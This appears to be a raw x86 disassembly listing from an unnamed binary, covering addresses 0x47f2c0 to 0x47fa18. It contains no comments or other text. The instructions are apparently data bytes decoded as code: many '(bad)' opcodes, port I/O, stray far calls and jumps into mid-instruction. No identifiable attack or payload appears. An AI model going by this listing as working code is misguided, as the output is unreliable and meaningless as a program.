  47f2c0:	cmp    eax,DWORD PTR [ebx]
  47f2c2:	cmp    DWORD PTR ds:0x7880e96f,esp
  47f2c8:	cdq    
  47f2c9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  47f2ca:	mov    ecx,0xa5c0589
  47f2cf:	push   es
  47f2d0:	push   es
  47f2d1:	test   BYTE PTR [edi],ah
  47f2d3:	dec    eax
  47f2d4:	or     al,0xb4
  47f2d6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  47f2d7:	pusha  
  47f2d8:	pop    ds
  47f2d9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  47f2da:	adc    DWORD PTR [edi+0x53ff6c6a],edi
  47f2e0:	push   0x95bdc256
  47f2e5:	ss addr16 mov ch,0x8e
  47f2e9:	into   
  47f2ea:	mov    dl,0x5b
  47f2ec:	push   edx
  47f2ed:	pop    fs
  47f2ef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  47f2f0:	jno    0x47f2a5
  47f2f2:	outs   dx,BYTE PTR ds:[esi]
  47f2f3:	mov    bh,0x0
  47f2f5:	call   0xe68b781c
  47f2fa:	jne    0x47f29c
  47f2fc:	xchg   ebp,eax
  47f2fe:	aam    0xbe
  47f300:	jg     0x47f31f
  47f302:	and    DWORD PTR ds:0xdf550ea2,edx
  47f308:	pop    eax
  47f309:	stos   DWORD PTR es:[edi],eax
  47f30a:	push   edx
  47f30b:	add    BYTE PTR [esi],ch
  47f30d:	icebp  
  47f30e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  47f30f:	int3   
  47f310:	pusha  
  47f311:	mov    cs,WORD PTR [edx]
  47f313:	inc    edx
  47f314:	mov    edi,0x4640e1fc
  47f319:	mov    bh,0x9a
  47f31b:	mov    ah,bh
  47f31d:	mov    eax,ds:0x12ad2616
  47f322:	push   0x21bfc0ce
  47f327:	push   edi
  47f328:	pop    ebx
  47f329:	mov    ah,0x90
  47f32b:	xchg   edi,eax
  47f32c:	xchg   DWORD PTR [ecx+eax*1+0x83126a3],ecx
  47f333:	xchg   DWORD PTR [ebx-0x8c9f0a6],ebp
  47f339:	add    al,0x80
  47f33b:	jge    0x47f2cd
  47f33d:	sub    DWORD PTR [eax],esp
  47f33f:	pop    eax
  47f340:	inc    edx
  47f341:	add    edi,DWORD PTR [edx]
  47f343:	dec    edi
  47f344:	fnstcw WORD PTR ds:0x8a578d41
  47f34a:	jns    0x47f2d3
  47f34c:	test   BYTE PTR [eax-0x38],dh
  47f34f:	cmp    ah,BYTE PTR [edx]
  47f351:	adc    DWORD PTR [edi],esp
  47f353:	and    bl,BYTE PTR [ebx+0x15739b32]
  47f359:	in     eax,dx
  47f35a:	clc    
  47f35b:	inc    esp
  47f35c:	adc    BYTE PTR [edx-0x40],dh
  47f35f:	lods   eax,DWORD PTR fs:[esi]
  47f361:	mov    ds:0xb04e705,al
  47f366:	mov    ds:0x581075e0,al
  47f36b:	in     al,0xf4
  47f36d:	imul   eax,DWORD PTR [esi],0x44
  47f370:	or     esp,DWORD PTR [eax+0x19]
  47f373:	adc    al,0x90
  47f375:	sbb    eax,0x7908c252
  47f37a:	arpl   WORD PTR [eax+edx*4],bx
  47f37d:	arpl   WORD PTR [eax+0x5721e00f],di
  47f383:	les    esi,FWORD PTR [edx+0x5f]
  47f386:	jo     0x47f379
  47f388:	test   esi,eax
  47f38a:	add    DWORD PTR [eax],eax
  47f38c:	mov    ah,0xc2
  47f38e:	xor    BYTE PTR [edi],cl
  47f390:	jge    0x47f3a1
  47f392:	add    eax,0xffffffbe
  47f395:	sub    eax,0xe4fe8134
  47f39a:	jb     0x47f3b4
  47f39c:	or     BYTE PTR [eax],cl
  47f39e:	jb     0x47f3c1
  47f3a0:	jmp    0x47f3f9
  47f3a2:	rcl    BYTE PTR [ebx],0x74
  47f3a5:	rcr    DWORD PTR [ecx+esi*8],cl
  47f3a8:	or     al,0x72
  47f3aa:	and    eax,0x9092ea0
  47f3af:	push   edi
  47f3b0:	xchg   ecx,eax
  47f3b1:	out    dx,al
  47f3b2:	inc    esi
  47f3b3:	mov    DWORD PTR [ecx-0xe],0xa5e196f6
  47f3ba:	sti    
  47f3bb:	jmp    0x47f3fc
  47f3bd:	sbb    al,BYTE PTR [edx]
  47f3bf:	push   esp
  47f3c0:	sub    cl,BYTE PTR [edi-0x5b]
  47f3c3:	pop    es
  47f3c4:	xor    DWORD PTR [ebx],eax
  47f3c6:	mov    db5,edx
  47f3c9:	dec    edi
  47f3ca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  47f3cb:	repnz add al,0x1b
  47f3ce:	adc    eax,0x321b1d05
  47f3d3:	pop    ebx
  47f3d4:	push   esp
  47f3d5:	pop    es
  47f3d6:	out    0x1e,al
  47f3d8:	or     BYTE PTR [ecx+0x33],al
  47f3db:	test   BYTE PTR [edi],dh
  47f3dd:	nop
  47f3de:	sub    edx,eax
  47f3e0:	inc    edx
  47f3e1:	mov    DWORD PTR [edx-0x70],ebx
  47f3e4:	push   es
  47f3e5:	pop    es
  47f3e6:	or     eax,0xdada2425
  47f3eb:	cmp    eax,ebx
  47f3ed:	lea    edx,[eax+0x7]
  47f3f0:	cmp    BYTE PTR [eax],dl
  47f3f2:	jmp    0x47f410
  47f3f4:	int    0x15
  47f3f6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  47f3f7:	and    cl,al
  47f3f9:	push   es
  47f3fa:	or     DWORD PTR [ecx+0x7e],edi
  47f3fd:	pop    ss
  47f3fe:	iret   
  47f3ff:	dec    edi
  47f400:	cmp    BYTE PTR [esi+0x68],0xf
  47f404:	xchg   DWORD PTR [eax+0x3],ebp
  47f407:	rcl    BYTE PTR [ebp+0x56],cl
  47f40a:	inc    edx
  47f40b:	mov    esi,0x769a69a6
  47f410:	or     al,0x0
  47f412:	add    DWORD PTR [edx],eax
  47f414:	add    eax,DWORD PTR [esi+ebx*4]
  47f417:	jmp    FWORD PTR [edi-0x66]
  47f41a:	add    eax,0x8070706
  47f41f:	or     BYTE PTR [ecx],cl
  47f421:	or     DWORD PTR [edx],ecx
  47f423:	or     cl,BYTE PTR [ebx]
  47f425:	or     ecx,DWORD PTR [esp+ecx*1]
  47f428:	or     eax,0xe79e790e
  47f42d:	jns    0x47f43e
  47f42f:	adc    BYTE PTR [ecx],dl
  47f431:	adc    dl,BYTE PTR [ebx]
  47f433:	out    0x79,eax
  47f435:	sahf   
  47f436:	out    0x14,eax
  47f438:	adc    eax,0xff181716
  47f43d:	out    0x79,eax
  47f43f:	sahf   
  47f440:	sbb    DWORD PTR [edx],ebx
  47f442:	sbb    ebx,DWORD PTR [ebx*1+0x21201f1e]
  47f449:	and    ah,BYTE PTR [ebx]
  47f44b:	and    al,0x9e
  47f44d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  47f44e:	sub    esp,ebp
  47f450:	and    eax,0x4cd859b0
  47f455:	push   es
  47f456:	addr16 js 0x47f3e2
  47f459:	jns    0x47f3f9
  47f45b:	out    0x79,eax
  47f45d:	call   0x3cf3:0xdecdbcab
  47f464:	int    0xe7
  47f466:	out    dx,eax
  47f467:	add    BYTE PTR [eax+0x11],bl
  47f46a:	and    dh,BYTE PTR [ebx]
  47f46c:	iret   
  47f46d:	repz cmp al,0xcf
  47f470:	inc    esp
  47f471:	push   ebp
  47f472:	data16 ja 0x47f3fd
  47f475:	cdq    
  47f476:	cmp    al,0xcf
  47f478:	repz cmp al,0xaa
  47f47b:	mov    ebx,0x79eeddcc
  47f480:	sahf   
  47f481:	out    0xf3,al
  47f483:	call   DWORD PTR [eax]
  47f485:	pop    ecx
  47f486:	and    DWORD PTR [edx],esi
  47f488:	inc    eax
  47f489:	out    0x79,eax
  47f48b:	sahf   
  47f48c:	out    0x4e,eax
  47f48e:	pop    esp
  47f48f:	push   0x78
  47f491:	xchg   BYTE PTR [esi-0x6b618f2a],dl
  47f497:	mov    ds:0x30dae595,al
  47f49c:	cmp    al,0x9c
  47f49e:	dec    ecx
  47f49f:	mov    bl,0x9b
  47f4a1:	add    eax,0xa4b90321
  47f4a6:	jb     0x47f4f1
  47f4a8:	or     BYTE PTR [ebx+ecx*1],al
  47f4ab:	add    eax,0x525ca92e
  47f4b0:	push   cs
  47f4b1:	push   es
  47f4b2:	adc    DWORD PTR [edi],eax
  47f4b4:	dec    ebx
  47f4b5:	sub    dl,BYTE PTR [edi+0x16081454]
  47f4bb:	xchg   edx,eax
  47f4bc:	retf   0x9525
  47f4bf:	or     DWORD PTR [eax],ebx
  47f4c1:	or     bl,BYTE PTR [edx]
  47f4c3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  47f4c4:	jb     0x47f50f
  47f4c6:	in     eax,0xb
  47f4c8:	sbb    al,0xc
  47f4ca:	push   ds
  47f4cb:	test   eax,0xdb9525c
  47f4d0:	and    BYTE PTR [esi],cl
  47f4d2:	and    al,0x2a
  47f4d4:	xchg   edi,eax
  47f4d5:	push   esp
  47f4d6:	movaps xmm2,XMMWORD PTR cs:[eax]
  47f4da:	sub    al,0xca
  47f4dc:	and    eax,0x30114b95
  47f4e1:	adc    dh,BYTE PTR [edx+0x49]
  47f4e4:	in     eax,0x92
  47f4e6:	xor    al,0x13
  47f4e8:	cmp    BYTE PTR [esp+ebx*2],dl
  47f4eb:	push   edx
  47f4ec:	mov    ecx,0x40153ca4
  47f4f1:	push   ss
  47f4f2:	xchg   edi,eax
  47f4f3:	push   esp
  47f4f4:	cs test eax,0x18481744
  47f4fa:	and    eax,0x4c2a4b95
  47f4ff:	sbb    DWORD PTR [eax+0x49],edx
  47f502:	in     eax,0x92
  47f504:	retf   0x541a
  47f507:	sbb    ebx,DWORD PTR [eax+0x74]
  47f50a:	mov    edx,0x5c1c72a4
  47f50f:	sbb    eax,0x69536031
  47f514:	int3   
  47f515:	stos   DWORD PTR es:[edi],eax
  47f516:	ja     0x47f532
  47f518:	push   ds
  47f519:	popa   
  47f51a:	imul   ebp,DWORD PTR [ecx+0x1fca953c],0x63205b62
  47f524:	sbb    DWORD PTR [edx+esi*2+0x218a4d55],esp
  47f52b:	and    al,BYTE PTR fs:[esi]
  47f52e:	test   eax,0x2365520c
  47f533:	data16 and al,0x90
  47f536:	retf   0xad20
  47f539:	adc    DWORD PTR [edi+0x25],esp
  47f53c:	push   0x24021819
  47f541:	pop    edi
  47f542:	mov    esp,0x8e2087e1
  47f547:	std    
  47f548:	push   0x2b
  47f54a:	add    esp,DWORD PTR [esp+ebx*2+0x5c]
  47f54e:	push   edx
  47f54f:	outs   dx,DWORD PTR ds:[esi]
  47f550:	imul   eax,DWORD PTR [ecx-0x38],0x2702c4f6
  47f557:	add    al,BYTE PTR [ebx+0x35c2041d]
  47f55d:	xchg   esi,eax
  47f55e:	dec    edx
  47f55f:	dec    ebx
  47f560:	mov    ds:0xd8f3dc02,al
  47f565:	fdivr  DWORD PTR [edi+esi*4-0x7f]
  47f569:	rol    DWORD PTR [ebp+0x59],0x1f
  47f56d:	pop    ebx
  47f56e:	inc    edx
  47f56f:	icebp  
  47f570:	or     cl,BYTE PTR [edx-0x78]
  47f573:	pop    edx
  47f574:	fmul   DWORD PTR [ebp+0x6ec4e87d]
  47f57a:	xor    BYTE PTR [ebx],0x23
  47f57d:	jb     0x47f5f7
  47f57f:	push   0xfffffff0
  47f581:	fstp   QWORD PTR [ebx-0x563b3409]
  47f587:	ds je  0x47f5eb
  47f58a:	or     al,0x20
  47f58c:	pop    edx
  47f58d:	push   0x3d
  47f58f:	sti    
  47f590:	xchg   edi,eax
  47f591:	add    DWORD PTR [edx],0x36af881
  47f597:	adc    eax,ebx
  47f599:	push   0xfffffffe
  47f59b:	es loopne 0x47f5f4
  47f59e:	nop
  47f59f:	add    bl,ah
  47f5a1:	sbb    eax,0xf78da7c2
  47f5a6:	adc    al,dh
  47f5a8:	mov    esp,0x82fb2bb4
  47f5ad:	(bad)  
  47f5ae:	adc    eax,0xc72bf0ac
  47f5b3:	xlat   BYTE PTR ds:[ebx]
  47f5b4:	sbb    eax,0xa82ecc44
  47f5b9:	cmp    ecx,eax
  47f5bb:	mov    esp,0x98590f6a
  47f5c0:	dec    ebx
  47f5c1:	or     al,0xb8
  47f5c3:	inc    eax
  47f5c4:	sar    BYTE PTR [ebx+0x522f44e4],0x79
  47f5cb:	neg    BYTE PTR [esi]
  47f5cd:	loopne 0x47f5dc
  47f5cf:	fadd   QWORD PTR [ebx+0x449d8c0]
  47f5d5:	cwde   
  47f5d6:	pop    es
  47f5d7:	(bad)  
  47f5d8:	push   edi
  47f5d9:	or     BYTE PTR [ebp+0x2b2cc4d],cl
  47f5df:	pop    ds
  47f5e0:	and    dh,BYTE PTR [ebp+0x23]
  47f5e3:	loope  0x47f623
  47f5e5:	shl    DWORD PTR [edx],0x94
  47f5e8:	and    eax,0x98e0dc44
  47f5ed:	sub    BYTE PTR [ecx+0x4268bc26],dl
  47f5f3:	nop
  47f5f4:	bound  esi,QWORD PTR [eax]
  47f5f6:	cmp    eax,0xad65fe4
  47f5fb:	mov    DWORD PTR [ecx],ecx
  47f5fd:	xchg   BYTE PTR [esi+eax*1+0x94242bf],bh
  47f604:	iret   
  47f605:	jmp    0x47f646
  47f607:	loopne 0x47f591
  47f609:	int3   
  47f60a:	cmp    BYTE PTR [ebp+0x270643c0],bl
  47f610:	xchg   ecx,eax
  47f611:	pop    ebx
  47f612:	jg     0x47f657
  47f614:	adc    eax,edi
  47f616:	jae    0x47f65c
  47f618:	push   ds
  47f619:	mov    eax,ds:0x80906fd8
  47f61e:	inc    edi
  47f61f:	pop    esi
  47f620:	add    bh,BYTE PTR [edx]
  47f622:	dec    eax
  47f623:	mov    bh,BYTE PTR [eax-0x114b985c]
  47f629:	and    dl,BYTE PTR [edi+ecx*8-0x89f8f68]
  47f630:	dec    esp
  47f631:	add    al,0x4f
  47f633:	mov    dh,al
  47f635:	add    DWORD PTR cs:[esp+ebx*8-0x65],esp
  47f63a:	jbe    0x47f628
  47f63c:	pop    esp
  47f63d:	pop    ds
  47f63e:	mov    esp,0x4306d616
  47f643:	xchg   ebx,eax
  47f644:	test   eax,0xd52c360f
  47f649:	inc    edx
  47f64a:	neg    eax
  47f64c:	fisttp DWORD PTR [esi+0x434fd603]
  47f652:	setno  BYTE PTR [esi]
  47f655:	js     0x47f6d6
  47f657:	push   es
  47f658:	(bad)  [esi+0x22]
  47f65b:	jo     0x47f5fd
  47f65d:	inc    edi
  47f65e:	inc    ebx
  47f65f:	(bad)  
  47f660:	sub    BYTE PTR ds:0x601340e,ch
  47f666:	mov    eax,ds:0x4c67d4c9
  47f66b:	xor    al,0xa
  47f66d:	inc    ebx
  47f66e:	neg    DWORD PTR [eax]
  47f670:	imul   DWORD PTR [ecx-0x25]
  47f673:	test   BYTE PTR [eax+0x667a8c9e],al
  47f679:	test   al,0xf4
  47f67b:	jle    0x47f68b
  47f67d:	imul   esi,DWORD PTR [esi+0x89c36ef],0x75
  47f684:	dec    esi
  47f685:	push   es
  47f686:	inc    eax
  47f687:	jb     0x47f6a7
  47f689:	lock (bad) 
  47f68b:	hlt    
  47f68c:	push   es
  47f68d:	call   0x162e:0xf8edbbed
  47f694:	and    al,0x2f
  47f696:	xchg   esi,eax
  47f697:	xchg   BYTE PTR [eax+eax*1+0x6],ch
  47f69b:	ror    BYTE PTR [ebx],0x38
  47f69e:	jnp    0x47f707
  47f6a0:	mov    bl,0x7d
  47f6a2:	dec    esp
  47f6a3:	push   cs
  47f6a4:	jbe    0x47f69e
  47f6a6:	or     al,0x74
  47f6a8:	dec    esi
  47f6a9:	ds xchg esp,eax
  47f6ab:	data16 fnstcw WORD PTR [esi+0x7350ef77]
  47f6b2:	outs   dx,BYTE PTR cs:[esi]
  47f6b4:	push   esi
  47f6b5:	push   cs
  47f6b6:	loopne 0x47f676
  47f6b8:	pop    eax
  47f6b9:	cmp    edx,DWORD PTR [esi]
  47f6bb:	add    BYTE PTR [ecx+0x7b],cl
  47f6be:	fisub  DWORD PTR [esi-0x4d]
  47f6c1:	cmp    al,0x81
  47f6c3:	call   0x1e8c0f0d
  47f6c8:	cwde   
  47f6c9:	pushf  
  47f6ca:	push   es
  47f6cb:	mov    bl,0xd9
  47f6cd:	sahf   
  47f6ce:	in     eax,dx
  47f6cf:	push   esp
  47f6d0:	dec    eax
  47f6d1:	jle    0x47f6cf
  47f6d3:	inc    edi
  47f6d4:	je     0x47f6bc
  47f6d6:	jo     0x47f669
  47f6d8:	dec    eax
  47f6d9:	xchg   BYTE PTR [eax],ch
  47f6db:	or     ecx,edi
  47f6dd:	fnsave [eax+0x6e]
  47f6e0:	xchg   DWORD PTR [esi+0x4],ebx
  47f6e3:	sahf   
  47f6e4:	add    al,BYTE PTR ds:0xb012f2df
  47f6ea:	adc    BYTE PTR [eax+0x7e852a05],dh
  47f6f0:	push   es
  47f6f1:	pushf  
  47f6f2:	dec    edx
  47f6f3:	add    eax,0xfb879eb
  47f6f8:	xchg   ebx,eax
  47f6f9:	and    esp,DWORD PTR [eax+ebx*1]
  47f6fc:	cdq    
  47f6fd:	adc    DWORD PTR [ecx+eiz*1],edx
  47f700:	mov    ah,0xe
  47f702:	push   es
  47f703:	xchg   esi,eax
  47f704:	addr16 pop es
  47f706:	sub    eax,0xdb5bad03
  47f70b:	mov    cl,0x5c
  47f70d:	(bad)  
  47f70e:	push   es
  47f70f:	or     eax,DWORD PTR [eax+0x58647453]
  47f715:	add    DWORD PTR [ecx+0x600f8893],edi
  47f71b:	pop    ebp
  47f71c:	inc    edx
  47f71d:	xchg   edx,eax
  47f71e:	xor    ebx,DWORD PTR [eax+ebx*8+0x2c1f5e3c]
  47f725:	pop    esi
  47f726:	fbld   TBYTE PTR [ebx+ebx*2-0x7763cb19]
  47f72d:	or     DWORD PTR [edi+ebx*4+0x3c],edx
  47f731:	pop    esi
  47f732:	dec    ecx
  47f733:	ret    
  47f734:	push   cs
  47f735:	imul   esp,DWORD PTR [ecx],0x925ce865
  47f73b:	xor    eax,0x36b4459b
  47f740:	sub    dl,dh
  47f742:	mov    ecx,0x78e65b20
  47f747:	add    DWORD PTR [eax+0x4392c3d6],ecx
  47f74d:	fadd   QWORD PTR ds:0xdb4f0706
  47f753:	int    0x80
  47f755:	sar    BYTE PTR [esi],0x61
  47f758:	mov    eax,0x238e54ce
  47f75d:	rcr    BYTE PTR [esi+0xc283fe0],1
  47f763:	mov    dl,0x41
  47f765:	inc    esi
  47f766:	sahf   
  47f767:	push   0x7af40c29
  47f76c:	pop    edi
  47f76d:	(bad)  
  47f76e:	gs ja  0x47f754
  47f771:	inc    edx
  47f772:	stos   BYTE PTR es:[edi],al
  47f773:	dec    BYTE PTR [eax+0xd07430d]
  47f779:	int3   
  47f77a:	pop    es
  47f77b:	out    dx,eax
  47f77c:	es pop edx
  47f77e:	shr    DWORD PTR [eax],cl
  47f780:	mov    BYTE PTR [eax+ebp*8-0x6c],ah
  47f784:	add    eax,0x67da6c2
  47f789:	push   0x880e452c
  47f78e:	mov    dh,0xdf
  47f790:	adc    DWORD PTR [edx-0x7d],ecx
  47f793:	mov    edx,0xe04ff80
  47f798:	inc    edx
  47f799:	and    BYTE PTR [esi],cl
  47f79b:	addr16 and cl,dh
  47f79e:	inc    esi
  47f79f:	add    eax,0x285b0f1e
  47f7a4:	shl    eax,0x40
  47f7a7:	ds add eax,0x3140744c
  47f7ad:	adc    BYTE PTR [eax],0x69
  47f7b0:	in     al,dx
  47f7b1:	sub    eax,0x7231504a
  47f7b6:	popa   
  47f7b7:	shr    BYTE PTR [eax],0x92
  47f7ba:	ret    
  47f7bb:	data16 xor BYTE PTR [eax],cl
  47f7be:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  47f7bf:	sbb    esi,DWORD PTR [edi]
  47f7c1:	leave  
  47f7c2:	mov    dh,0xe
  47f7c4:	mov    al,ds:0x75c4ce75
  47f7c9:	adc    DWORD PTR [edx-0x5160fbb4],ecx
  47f7cf:	xor    BYTE PTR [edi+edi*1-0x58],al
  47f7d3:	cmp    al,0x60
  47f7d5:	fst    DWORD PTR [edx]
  47f7d7:	daa    
  47f7d8:	mov    BYTE PTR [ebp+0x12],dl
  47f7db:	push   esp
  47f7dc:	xchg   BYTE PTR [ebx+0x53],ch
  47f7df:	enter  0xe618,0xce
  47f7e3:	inc    ebx
  47f7e4:	inc    eax
  47f7e5:	push   ds
  47f7e6:	jp     0x47f7ef
  47f7e8:	inc    ebp
  47f7e9:	hlt    
  47f7ea:	xchg   edi,eax
  47f7eb:	stos   BYTE PTR es:[edi],al
  47f7ec:	aam    0xc8
  47f7ee:	out    dx,eax
  47f7ef:	or     bl,BYTE PTR [edi+eiz*2+0x6d3b9806]
  47f7f6:	inc    ecx
  47f7f7:	jae    0x47f813
  47f7f9:	fdivr  QWORD PTR [edi-0x70f864b8]
  47f7ff:	pop    esi
  47f800:	mov    eax,ds:0x481419de
  47f805:	dec    ebx
  47f806:	inc    eax
  47f807:	push   esp
  47f808:	inc    esp
  47f809:	pop    ebp
  47f80a:	inc    esp
  47f80b:	push   es
  47f80c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  47f80d:	jns    0x47f86f
  47f80f:	(bad)  
  47f810:	adc    eax,0x381af0e9
  47f815:	sub    ebx,DWORD PTR [ebx]
  47f817:	push   eax
  47f818:	cmp    al,0x64
  47f81a:	jno    0x47f848
  47f81c:	dec    eax
  47f81d:	sub    BYTE PTR [ebx+0x17],al
  47f820:	push   ebp
  47f821:	push   ss
  47f822:	sub    cl,BYTE PTR [ebx-0x10]
  47f825:	sar    BYTE PTR [eax+edx*4],1
  47f828:	pop    esi
  47f829:	push   0xba68ac58
  47f82e:	pop    es
  47f82f:	adc    dl,bh
  47f831:	mov    ch,0x17
  47f833:	pop    edi
  47f834:	add    DWORD PTR [eax+0x25],0xfe2ed6eb
  47f83b:	mov    esp,0x30180fc7
  47f840:	pop    edi
  47f841:	in     al,dx
  47f842:	mov    ebp,0x6054e3d0
  47f847:	xchg   edx,eax
  47f848:	ins    BYTE PTR es:[edi],dx
  47f849:	push   ebp
  47f84a:	sbb    DWORD PTR [eax],eax
  47f84c:	push   cs
  47f84d:	icebp  
  47f84e:	je     0x47f87b
  47f850:	es push ebp
  47f852:	push   ecx
  47f853:	pop    edx
  47f854:	sub    BYTE PTR [esi],ch
  47f856:	and    cl,BYTE PTR [edi]
  47f858:	ins    BYTE PTR es:[edi],dx
  47f859:	or     BYTE PTR [ecx+0x1a],dl
  47f85c:	add    BYTE PTR [ebx],cl
  47f85e:	sbb    eax,0xecd90990
  47f863:	dec    ebx
  47f864:	test   eax,0x1b75d001
  47f869:	daa    
  47f86a:	test   BYTE PTR ds:0x9659ddc3,0x90
  47f871:	or     eax,0x90001c4b
  47f876:	aaa    
  47f877:	add    al,0x91
  47f879:	or     cl,BYTE PTR [ecx+0x1cd8489a]
  47f87f:	or     BYTE PTR [ecx],ah
  47f881:	mov    eax,0x4874331d
  47f886:	or     ecx,edi
  47f888:	rcr    DWORD PTR [esi-0x46],1
  47f88b:	lock cli 
  47f88d:	inc    eax
  47f88e:	jl     0x47f894
  47f890:	sbb    al,0xc
  47f892:	adc    al,BYTE PTR [eax+ebp*8+0x50e61ea2]
  47f899:	outs   dx,DWORD PTR ds:[esi]
  47f89a:	jo     0x47f85e
  47f89c:	xchg   edi,eax
  47f89d:	cmp    al,0xf
  47f89f:	iret   
  47f8a0:	xchg   edi,eax
  47f8a1:	cwde   
  47f8a2:	cdq    
  47f8a3:	pusha  
  47f8a4:	mov    ah,0x7c
  47f8a6:	pop    ds
  47f8a7:	neg    BYTE PTR [esi]
  47f8a9:	fld    QWORD PTR [esi-0x1c]
  47f8ac:	lea    edx,[eax]
  47f8ae:	push   ss
  47f8af:	cld    
  47f8b0:	jne    0x47f8ee
  47f8b2:	jbe    0x47f841
  47f8b4:	enter  0x3ed0,0x94
  47f8b8:	and    BYTE PTR [eax],0x44
  47f8bb:	push   esp
  47f8bc:	call   0x63574851
  47f8c1:	jns    0x47f910
  47f8c3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  47f8c4:	xchg   esp,eax
  47f8c5:	jbe    0x47f895
  47f8c7:	dec    esp
  47f8c8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  47f8c9:	cwde   
  47f8ca:	and    DWORD PTR [eax],esi
  47f8cc:	inc    esp
  47f8cd:	jbe    0x47f8a9
  47f8cf:	iret   
  47f8d0:	ror    DWORD PTR [esi],0xac
  47f8d3:	sahf   
  47f8d4:	push   edi
  47f8d5:	test   BYTE PTR [edx+0x69cb94ba],ah
  47f8db:	test   BYTE PTR [ecx+esi*8+0x76],dh
  47f8df:	and    al,BYTE PTR [edx+0x56]
  47f8e2:	imul   esi,DWORD PTR [ebx+0x69],0x5369076
  47f8e9:	mov    ebx,0x8620a46b
  47f8ee:	pop    es
  47f8ef:	or     BYTE PTR ds:0x18422313,ch
  47f8f5:	sub    ecx,DWORD PTR [edx+ebp*4+0x4f]
  47f8f9:	aam    0xb2
  47f8fb:	xor    BYTE PTR [ecx+ecx*8],cl
  47f8fe:	xor    BYTE PTR [eax],dl
  47f900:	mov    eax,0x73afa13
  47f905:	lahf   
  47f906:	and    al,0x7
  47f908:	xchg   edi,eax
  47f909:	mov    ah,0x4e
  47f90b:	lock inc edx
  47f90d:	adc    esi,DWORD PTR [ecx+0x75e42f9a]
  47f913:	xchg   ebp,eax
  47f914:	sub    BYTE PTR [eax+0x28],dl
  47f917:	and    eax,0x76440a00
  47f91c:	adc    ebp,0xffffffcf
  47f91f:	(bad)  
  47f920:	fwait
  47f921:	rol    bl,1
  47f923:	mov    eax,0x6d490622
  47f928:	neg    BYTE PTR [eax+0xe]
  47f92b:	es loop 0x47f934
  47f92e:	xchg   esi,eax
  47f92f:	aam    0xc4
  47f931:	shl    DWORD PTR [edx+0x21],cl
  47f934:	scas   eax,DWORD PTR es:[edi]
  47f935:	dec    eax
  47f936:	mov    al,0x92
  47f938:	mov    al,0x27
  47f93a:	add    dl,BYTE PTR [edi]
  47f93c:	repnz xor al,0xbb
  47f93f:	dec    ecx
  47f940:	cmp    al,0xc5
  47f942:	mov    eax,0x8ad728b8
  47f947:	adc    BYTE PTR [esi],ah
  47f949:	iret   
  47f94a:	dec    eax
  47f94b:	fcom   QWORD PTR [edi]
  47f94d:	in     al,0x42
  47f94f:	sahf   
  47f950:	lock lock sub DWORD PTR [ecx-0x34],ecx
  47f955:	pop    ss
  47f956:	repnz pop esi
  47f958:	js     0x47f936
  47f95a:	or     BYTE PTR [edx+0x9002a08],dl
  47f960:	and    DWORD PTR [edi-0x19],ecx
  47f963:	mov    al,ah
  47f965:	fs cdq 
  47f967:	inc    edi
  47f968:	sbb    BYTE PTR [eax],bl
  47f96a:	mov    esp,0x2b726e0e
  47f96f:	xchg   edi,eax
  47f970:	add    eax,eax
  47f972:	inc    esi
  47f973:	rcr    BYTE PTR [edx+edx*4+0x2c85f2],0x7
  47f97b:	jp     0x47f91b
  47f97d:	das    
  47f97e:	in     al,0xe9
  47f980:	inc    ebx
  47f981:	enter  0x2dc8,0x0
  47f985:	push   es
  47f986:	js     0x47f9e7
  47f988:	enter  0xab6b,0xae
  47f98c:	test   dh,al
  47f98e:	int3   
  47f98f:	rol    BYTE PTR [eax-0x30],1
  47f992:	add    BYTE PTR cs:0x32d4ac12,cl
  47f999:	mov    ?,ebp
  47f99b:	sahf   
  47f99c:	nop
  47f99d:	out    0x3d,eax
  47f99f:	push   esp
  47f9a0:	in     al,0xc1
  47f9a2:	dec    esi
  47f9a3:	add    BYTE PTR [eax],al
  47f9a5:	das    
  47f9a6:	add    BYTE PTR [ebx],cl
  47f9a8:	add    eax,0x876086de
  47f9ad:	push   0x3c85c877
  47f9b2:	in     eax,dx
  47f9b3:	outs   dx,BYTE PTR ds:[esi]
  47f9b4:	pop    esp
  47f9b5:	ret    0xd84a
  47f9b8:	fdiv   DWORD PTR [eax]
  47f9ba:	nop
  47f9bb:	xlat   BYTE PTR ds:[ebx]
  47f9bc:	or     DWORD PTR [eax+ecx*1-0x2],ebp
  47f9c0:	xchg   edi,eax
  47f9c1:	loopne 0x47fa0d
  47f9c3:	loopne 0x47f962
  47f9c5:	or     DWORD PTR [edi-0x42],0x31
  47f9c9:	add    BYTE PTR [ecx],cl
  47f9cb:	push   ebp
  47f9cc:	jo     0x47fa06
  47f9ce:	add    BYTE PTR cs:[eax+0x6d83943],al
  47f9d5:	xchg   ebx,eax
  47f9d6:	xor    dl,dl
  47f9d8:	in     al,0x69
  47f9da:	pop    ds
  47f9db:	inc    esi
  47f9dc:	pop    edx
  47f9dd:	dec    eax
  47f9de:	xor    ah,al
  47f9e0:	dec    edx
  47f9e1:	adc    BYTE PTR [eax],dl
  47f9e3:	mov    ah,0xf
  47f9e5:	dec    ecx
  47f9e6:	xor    ecx,DWORD PTR cs:[esp+ecx*8-0x3b]
  47f9eb:	dec    edx
  47f9ec:	lock pop ss
  47f9ee:	int    0x17
  47f9f0:	repnz lock xor al,0x0
  47f9f4:	or     BYTE PTR [ebp+0x75],dl
  47f9f7:	enter  0xec4,0x58
  47f9fb:	mov    fs,WORD PTR [edx+eax*2+0x2d]
  47f9ff:	ror    DWORD PTR [edi],0xc0
  47fa02:	(bad)  
  47fa03:	sbb    cl,BYTE PTR [ecx+eiz*2+0x79]
  47fa07:	or     BYTE PTR [esi-0x5e7ce216],al
  47fa0d:	dec    esp
  47fa0e:	xor    al,BYTE PTR ds:0xacb60f6c
  47fa14:	pop    edx
  47fa15:	ror    BYTE PTR [eax],0xa
  47fa18:	jae    0x47f9dd
